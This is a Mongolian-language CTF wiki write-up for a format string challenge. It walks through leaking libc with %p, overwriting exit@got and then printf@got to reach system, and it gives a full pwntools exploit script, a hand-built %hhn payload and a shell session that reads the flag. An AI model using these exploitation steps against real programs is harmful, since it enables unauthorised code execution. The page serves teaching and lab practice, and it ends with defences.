---
title: Format string
description: printf() format string эмзэг байдлаар санах ой унших, бичих, GOT давталт үүсгэж libc-ээр shell нээх.
---

**format string** эмзэг байдал нь `printf(user_input)` шиг хэрэглэгчийн оролтыг **format мөр** болгон шууд
дамжуулснаас үүснэ. Stack overflow огт хэрэггүй — зөвхөн `%` тэмдэг бүхий оролтоор программын санах ойг
**унших** (libc leak) ба **бичих** (GOT дарж бичих) боломжтой болно.

Энэ бодлогод `win()` функц **байхгүй**. Иймээс **ret2libc**-тэй адил libc доторх `system`-ийг
дуудна. Гол санаа: `exit@got`-ийг дарж бичиж **давталт** үүсгээд, format string-ийг хэд хэдэн удаа ашиглана.

:::note[Суурь мэдлэг]
- [ret2text](../ret2text/); [GOT ба PLT](../basics/got-plt/) (бид GOT дарж бичнэ), [RELRO](../basics/protections/#relro); [ASLR](../basics/protections/#aslr), [NX](../basics/protections/#nx)
- [pwndbg](../tools/gdb/) ([got](../tools/gdb/#got--got-ийн-төлөв) команд), [pwntools](../tools/pwntools/) үндэс
:::

## Санаа

`printf("%d\n", x)`-д эхний аргумент (`"%d\n"`) нь **format мөр**. `printf(buf)` гэвэл **хэрэглэгчийн оролт өөрөө
format мөр** болж, `%`-тэй тохиолдол бүрт stack дээрх утгыг аргумент мэтээр боловсруулна. Энэ нь хоёр **примитив**
өгнө:

| Specifier | Примитив |
|-----------|----------|
| `%p` / `%x` | Stack дээрх утгыг **хэвлэх** (унших) |
| `%s` | Заагчийн заасан хаяг дахь мөрийг хэвлэх (дурын хаяг **унших**) |
| `%n` | Хэвлэсэн тэмдэгтийн тоог заасан хаягт **бичих** (дурын хаяг **бичих**) |
| `%7$p` | 7 дахь аргументыг шууд сонгох (**positional**) |

`win()` байхгүй тул shell нээхэд гурван зүйл хэрэгтэй:

1. **libc хаяг leak** (унших примитив) — `%p`-ээр libc доторх хаяг олж base-ийг тооцно ([ASLR](../basics/protections/#aslr) тойрно).
2. **Давталт** — `printf` ганц удаа дуудагддаг тул leak болон бичилтийг нэг дор хийж чадахгүй. `exit@got`-ийг
   `vuln`-ээр дарж бичвэл `exit()` → `vuln` болж **format string-ийг дахин дахин** ашиглана.
3. **`printf@got` → `system`** (бичих примитив) — дараа нь `printf(buf)` нь үнэндээ `system(buf)` болох тул
   `"/bin/sh"` илгээхэд shell нээгдэнэ.

 Ашиглах нөхцөл:

| Хамгаалалт | Шаардлага | Яагаад |
|------------|-----------|--------|
| RELRO | **Partial** | GOT (`exit`, `printf`) бичих боломжтой байх ёстой |
| PIE | **Байхгүй** (эсвэл base leak) | GOT, `vuln`-ийн хаягийг мэдэх хэрэгтэй. PIE үед эдгээр санамсаргүй болох ч `%p`-ээр code хаяг leak хийж binary base-ийг тооцвол ажиллана |
| Canary | Хамаагүй | Buffer overflow хийхгүй |
| NX | Хамаагүй | Shellcode ажиллуулахгүй |

## Бодлого

Бүх файл [`challenges/pwn/fmtstr`](https://github.com/computer-communication-security-club/ctf-wiki/tree/main/challenges/pwn/fmtstr) хавтсанд байна:

| Файл | Тайлбар |
|------|---------|
| [`main.c`](https://github.com/computer-communication-security-club/ctf-wiki/blob/main/challenges/pwn/fmtstr/main.c) | Эх код |
| [`fmtstr`](https://github.com/computer-communication-security-club/ctf-wiki/raw/main/challenges/pwn/fmtstr/fmtstr) | Бэлэн binary |
| [`libc.so.6`](https://github.com/computer-communication-security-club/ctf-wiki/raw/main/challenges/pwn/fmtstr/libc.so.6) | Challenge-ийн ашигладаг libc — **offset тооцоход хэрэгтэй** |
| [`ld-linux-x86-64.so.2`](https://github.com/computer-communication-security-club/ctf-wiki/raw/main/challenges/pwn/fmtstr/ld-linux-x86-64.so.2) | Дээрх libc-ийн loader |
| [`Dockerfile`](https://github.com/computer-communication-security-club/ctf-wiki/blob/main/challenges/pwn/fmtstr/Dockerfile) | Challenge сервер (deploy) |
| [`Makefile`](https://github.com/computer-communication-security-club/ctf-wiki/blob/main/challenges/pwn/fmtstr/Makefile) | `make run`, `make stop` |

:::caution[libc-ийн хувилбар]
`system`-ийн offset нь libc-ийн хувилбараас хамаарна. Challenge нь ашигладаг `libc.so.6`-оо хамт тараадаг бөгөөд
binary нь `rpath`-аар зассан тул энэ libc-ийг (өөрийн машины libc биш) ачаална. **Challenge хавтаснаасаа**
ажиллуулаарай ([ldd ./fmtstr](../tools/gdb/) → `libc.so.6 => ./libc.so.6`).
:::

```console
$ cd challenges/pwn/fmtstr
$ make run      # localhost:1337 дээр асна
$ nc localhost 1337
What is your name?
$ make stop
```

:::caution[Spoiler]
Доорх хэсэгт бодолт байгаа. Эхлээд өөрөө оролдоод үзээрэй!
:::

## Шийдэл

### 1. Эх код

```c title="main.c"
void vuln(void) {
    char buf[128];
    puts("What is your name?");
    read(0, buf, sizeof(buf) - 1);
    printf(buf);        // format string vulnerability
    puts("Bye!");
    exit(0);
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    return 0;
}
```

- `printf(buf)` — хэрэглэгчийн оролтыг format мөр болгож байна. Зөв нь `printf("%s", buf)`.
- `win()` **байхгүй**.
- `vuln` төгсгөлд `exit(0)` дуудагдана — энэ `exit`-ийн GOT entry-г дарж бичиж **давталт** үүсгэнэ.

### 2. Хамгаалалт шалгах

```console
$ checksec --file=fmtstr
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    RUNPATH:    b'$ORIGIN'
```

`Partial RELRO` — GOT бичигдэнэ. `No PIE` — GOT, `vuln`-ийн хаяг тогтмол. `vuln`-ийг disassemble хийвэл:

```ansi
[1;31mpwndbg>[0m disassemble vuln
Dump of assembler code for function vuln:
   [34m0x00000000004011b6[0m <+0>:	[32mendbr64[0m
   [34m0x00000000004011ba[0m <+4>:	[32mpush   [0m[31mrbp[0m
   [34m0x00000000004011bb[0m <+5>:	[32mmov    [0m[31mrbp[0m,[31mrsp[0m
   [34m0x00000000004011be[0m <+8>:	[32madd    [0m[31mrsp[0m,[34m0xffffffffffffff80[0m
   [34m0x00000000004011c2[0m <+12>:	[32mlea    [0m[31mrax[0m,[[31mrip[0m[34m+[0m[34m0xe3b[0m][90m        # [0m[90m0x402004[0m
   [34m0x00000000004011c9[0m <+19>:	[32mmov    [0m[31mrdi[0m,[31mrax[0m
   [34m0x00000000004011cc[0m <+22>:	[32mcall   [0m[34m0x401080[0m <[33mputs@plt[0m>
   [34m0x00000000004011d1[0m <+27>:	[32mlea    [0m[31mrax[0m,[[31mrbp[0m[34m-[0m[34m0x80[0m]
   [34m0x00000000004011d5[0m <+31>:	[32mmov    [0m[31medx[0m,[34m0x7f[0m
   [34m0x00000000004011da[0m <+36>:	[32mmov    [0m[31mrsi[0m,[31mrax[0m
   [34m0x00000000004011dd[0m <+39>:	[32mmov    [0m[31medi[0m,[34m0x0[0m
   [34m0x00000000004011e2[0m <+44>:	[32mcall   [0m[34m0x4010a0[0m <[33mread@plt[0m>
   [34m0x00000000004011e7[0m <+49>:	[32mlea    [0m[31mrax[0m,[[31mrbp[0m[34m-[0m[34m0x80[0m]
   [34m0x00000000004011eb[0m <+53>:	[32mmov    [0m[31mrdi[0m,[31mrax[0m
   [34m0x00000000004011ee[0m <+56>:	[32mmov    [0m[31meax[0m,[34m0x0[0m
   [34m0x00000000004011f3[0m <+61>:	[32mcall   [0m[34m0x401090[0m <[33mprintf@plt[0m>
   [34m0x00000000004011f8[0m <+66>:	[32mlea    [0m[31mrax[0m,[[31mrip[0m[34m+[0m[34m0xe18[0m][90m        # [0m[90m0x402017[0m
   [34m0x00000000004011ff[0m <+73>:	[32mmov    [0m[31mrdi[0m,[31mrax[0m
   [34m0x0000000000401202[0m <+76>:	[32mcall   [0m[34m0x401080[0m <[33mputs@plt[0m>
   [34m0x0000000000401207[0m <+81>:	[32mmov    [0m[31medi[0m,[34m0x0[0m
   [34m0x000000000040120c[0m <+86>:	[32mcall   [0m[34m0x4010c0[0m <[33mexit@plt[0m>
End of assembler dump.
```

`printf(buf)` (`<+61>`)-ийн дараа `puts("Bye!")` (`<+76>`), эцэст нь `exit` (`<+86>`) дуудагдана. Эдгээрийн
GOT entry бүгд дарж бичих боломжтой.

### 3. Stack унших ба libc leak

`AAAAAAAA` дараа нь хэдэн `%p`:

```console
$ ./fmtstr
What is your name?
AAAAAAAA %p %p %p %p %p %p
AAAAAAAA 0x7ffd7ae1d6f0 0x1b 0x7a4efb4a03e6 (nil) (nil) 0x4141414141414141
```

- **6 дахь** `%p` = `0x4141414141414141` — бидний оролт. **offset = 6**.
- **3 дахь** `%p` = `0x7a4efb4a03e6` — libc доторх хаяг (`read`-ийн syscall wrapper-ийн буцах хаяг,
  `__syscall_cancel+166`). gdb-ээр нэг удаа `leak − libc_base`-ийг олоход энэ offset нь **`0xa03e6`**:

```python
io.sendlineafter(b'name?\n', b'%3$p')
libc.address = int(io.recvline(), 16) - 0xa03e6     # libc base
```

:::note[PIE идэвхтэй бол]
Энэ binary **No PIE** тул `vuln`, GOT-ийн хаяг тогтмол. Хэрэв PIE идэвхтэй байсан бол эдгээр санамсаргүй болох ч
яг адил аргаар — `%p`-ээр stack дээрх **binary доторх (code) хаягийг** (жишээ нь хадгалсан буцах хаяг) leak хийж,
`exe.address = leak − known_offset` гэж **binary base**-ийг тооцно. Нэг leak-ээр libc, нөгөөгөөр binary base-ийг
олоод цааш ижил үргэлжилнэ.
:::

### 4. exit@got → vuln: давталт үүсгэх

`printf` ганц удаа дуудагддаг тул leak болон GOT бичилтийг **нэг format string дотор хослуулж чадахгүй**
(leak-ийн хэвлэлт `%n`-ийн тооллыг эвдэнэ). Шийдэл: `vuln` төгсгөлийн `exit()`-ийг өөрсдийн ашигт болгох.

`exit@got`-ийг `vuln`-ийн хаягаар дарж бичвэл `exit()` дуудагдахад `vuln` руу буцаж, format string **дахин**
ажиллана. Ингэснээр хэдэн ч удаа дайрах боломжтой болно:

```python
io.sendlineafter(b'name?\n', fmtstr_payload(6, {exe.got.exit: exe.sym.vuln}))
```

<details>
<summary><strong><code>%n</code>-ээр payload-ийг гараар бичих</strong> (fmtstr_payload юу хийдэг вэ)</summary>

`%n` нь "одоо хүртэл **хэвлэсэн тэмдэгтийн тоо**"-г аргументын заасан хаягт бичдэг. Тэгэхээр бичих **утга** = хэвлэсэн
тэмдэгтийн тоо. Тэмдэгтийн тоог `%<N>c` (нэг тэмдэгтийг `N` өргөнтэй хэвлэх = `N` тэмдэгт) -ээр нарийн хянана.

**Асуудал:** бүтэн хаяг (жишээ нь `0x4011b6`) -ийг нэг `%n`-ээр бичих гэвэл `0x4011b6` ≈ 4 сая тэмдэгт хэвлэх хэрэгтэй —
практик биш. **Шийдэл:** `%hhn` (нэг **байт** бичнэ, `тоо & 0xff`) ашиглан хаягийг **байт байтаар** бичнэ.

Бидэнд `exit@got` (`0x404020`) -д `vuln` (`0x4011b6`) бичих хэрэгтэй. Little-endian байтууд: `b6 11 40 00 …`.
`exit@got` нь lazy binding-ийн улмаас эхлээд PLT дотор (дээд байтууд нь `00`) заадаг тул зөвхөн доод **3 байт**
(`b6`, `11`, `40`) -ийг `0x404020`, `0x404021`, `0x404022` -д бичихэд хангалттай.

Гурван дүрэм:

1. **Хаягуудыг payload-ийн төгсгөлд** тавина. Хаягт `\x00` байт байдаг ба `printf` эхний `\x00` дээр зогсдог тул
   format директивүүд бүгд түүнээс өмнө байх ёстой.
2. **Байтуудыг өсөх дарааллаар** бичнэ (тоолол зөвхөн нэмэгддэг): `0x11` → `0x40` → `0xb6`.
3. Хаяг бүрийг **positional** (`%k$hhn`) -ээр заана. Оролт offset 6-д байгаа тул format хэсгийг яг **40 байт**
   (5 slot: 6–10) болгон нөхвөл гурван хаяг 11, 12, 13-р slot-д буух тул `%11$`, `%12$`, `%13$` гэж заана.

```python
from pwn import p64

payload  = b'%17c%12$hhn'    # 17 тэмдэгт хэвлээд 0x404021 <- 0x11
payload += b'%47c%13$hhn'    # +47 = нийт 64 (0x40), 0x404022 <- 0x40
payload += b'%118c%11$hhn'   # +118 = нийт 182 (0xb6), 0x404020 <- 0xb6
payload  = payload.ljust(40, b'A')   # format хэсгийг 40 байт болгож нөхнө
payload += p64(0x404020) + p64(0x404021) + p64(0x404022)   # slot 11, 12, 13
```

Энэ гарын payload дээрх `fmtstr_payload(6, {exe.got.exit: exe.sym.vuln})`-тэй яг ижил үр дүн өгнө — `exit@got`-ийг
`0x4011b6` болгоно. `fmtstr_payload` нь энэ бүх тооцоог (байтын дараалал, өргөн, slot, зэрэгцүүлэлт) автоматаар хийдэг.

</details>

gdb-ээр баталгаажуулъя — `exit@got` нь `vuln` (`0x4011b6`) болсон:

```console
pwndbg> break *0x40120c             # exit() дуудлагын өмнө
pwndbg> run < payload
pwndbg> p/x *(long*)0x404020        # exit@got
$1 = 0x4011b6                       # = vuln
```

Payload илгээсний дараа программ `Bye!` хэвлээд `exit()` → `vuln` → дахин `What is your name?` гэж асууна —
давталт үүслээ.

### 5. printf@got → system ба shell

Давталт байгаа тул одоо:

1. **libc base** leak хийнэ (3-р алхам).
2. `printf@got`-ийг `system`-ийн хаягаар дарж бичнэ:

   ```python
   io.sendlineafter(b'name?\n', fmtstr_payload(6, {exe.got.printf: libc.sym.system}))
   ```

3. Дараагийн давталтад `printf(buf)` нь үнэндээ **`system(buf)`** болсон тул `"/bin/sh"` илгээхэд shell нээгдэнэ:

   ```python
   io.sendlineafter(b'name?\n', b'/bin/sh\x00')
   ```

### 6. Exploit

Бүтэн [exploit.py](../tools/pwntools/#pwn-template) (тодруулсан мөрүүд):

```python title="exploit.py" ins={40-59}
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './fmtstr')
libc = ELF('./libc.so.6')   # challenge-тэй хамт ирсэн libc

host = args.HOST or 'localhost'
port = int(args.PORT or 1337)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

offset = 6
LEAK_OFFSET = 0xa03e6       # %3$p (__syscall_cancel+166)-ийн libc base-ээс зай (gdb-ээр нэг удаа олов)

io = start()

# --- 1-р шат: exit@got -> vuln. exit() дуудагдахад vuln руу буцаж ДАВТАЛТ үүснэ ---
io.sendlineafter(b'name?\n', fmtstr_payload(offset, {exe.got.exit: exe.sym.vuln}))

# --- 2-р шат: libc хаяг leak ---
io.sendlineafter(b'name?\n', b'%3$p')
libc.address = int(io.recvline(), 16) - LEAK_OFFSET
log.success(f'libc = {hex(libc.address)}')

# --- 3-р шат: printf@got -> system ---
io.sendlineafter(b'name?\n', fmtstr_payload(offset, {exe.got.printf: libc.sym.system}))

# --- 4-р шат: printf(buf) == system(buf). "/bin/sh" илгээж shell нээнэ ---
io.sendlineafter(b'name?\n', b'/bin/sh\x00')

io.interactive()
```

Дөрвөн шат (давталт → leak → `printf@got` дарах → `/bin/sh`) дараалан гүйцэтгэгдэж shell нээгдэнэ:

```console
$ ./exploit.py LOCAL
[+] libc = 0x745c34800000
[*] Switching to interactive mode
$ id
uid=1001(agent) gid=1001(agent) ...
$ cat flag.txt
FLAG{f0rmat_str1ng_g0t_0verwrite}
```

```console
$ ./exploit.py HOST=ctf.example.com PORT=31337
```

:::tip
Leak хийсэн хаяг дотор `\x0a` (newline) байт тохиолдвол `recvline` таслана. Тийм үед дахин ажиллуулаарай.
:::

## Хамгаалалт

- **Format мөрөө хэзээ ч хувьсагчаар бүү дамжуул.** `printf(buf)` биш, `printf("%s", buf)`. Энэ ганц дүрэм
  format string эмзэг байдлыг бүрэн арилгана.
- Compiler анхааруулдаг: `gcc -Wformat -Wformat-security` нь `format not a string literal` анхааруулга өгнө.
- **Full RELRO** (`-Wl,-z,relro,-z,now`) — GOT-ийг зөвхөн унших болгож `exit@got`, `printf@got` дарахыг хаана.
- PIE + ASLR — GOT, кодын хаягийг таахад хэцүү болгоно.

## Эх сурвалж

- [CTF Wiki — Format String Vulnerability](https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/)
- [ir0nstone — Format String](https://ir0nstone.gitbook.io/notes/binexp/stack/format-string)
- [pwntools — fmtstr_payload](https://docs.pwntools.com/en/stable/fmtstr.html)
- [Phrack #59 — Advances in Format String Exploitation](https://phrack.org/issues/59/advances-in-format-string-exploitation) (gera & riq)
